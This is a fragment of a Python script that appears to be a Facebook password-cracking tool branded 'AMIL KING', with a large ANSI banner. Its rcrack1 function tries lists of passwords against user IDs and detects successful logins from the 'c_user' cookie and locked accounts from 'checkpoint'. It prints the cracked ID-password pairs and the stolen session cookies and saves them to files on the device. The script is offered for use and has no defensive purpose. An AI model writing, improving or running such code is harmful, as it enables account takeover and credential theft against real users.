#https://github.com/TEAM-CIPHER-404
...
ugen = []
try:
    uf=open('user.txt','r').read().splitlines()
    for ua in uf:
        ugen.append(ua)
except:
...
│         \033[32m ██║  ██║██║ ╚═╝ ██║██║███████╗
│          \033[93m╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚══════╝                           
│                                      \033[33mVersion  \033[95mV.2.0     │
└─────────────────────────────────────────────────────────┘
 \033[1;32m[\033[0;41;37m==========={ ᎪႮͲᎻᎬᎡ 🔥\033[0;37;41m AMIL KING 👑 }===========\033[1;37;40m\033[1;32m] \033[1;37;40m     
           \033[1;47;40m╔═════════════════════════╗
       \033[1;37;40m    ║  ҒB \033[93;1m>\033[1;32m AMIL ❤️    ║  
       \033[1;37;40m    ║  ᎢᝪᝪᏞ   \033[93;1m>\033[1;32m AMIL        ║
       \033[1;37;40m    ║  ᎪႮͲᎻᎬᎡ \033[93;1m> \033[1;32mAMIL KING   ║
       \033[1;37;40m    ║  ᏀᏆͲᎻႮᏴ\033[93;1m > \033[1;32⭕❌            ║
           \033[1;47;40m╚═════════════════════════╝\033[1;35m""")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mAMIL\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[AMIL-OK🌻] {uid}|{ps}")
                print(f"\n[COOKIE🎁] : {coki}")
                open('/sdcard/AMIL/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[AMIL-CP❌] {uid}|{ps}")
                open('/sdcard/AMIL-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[AMIL-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
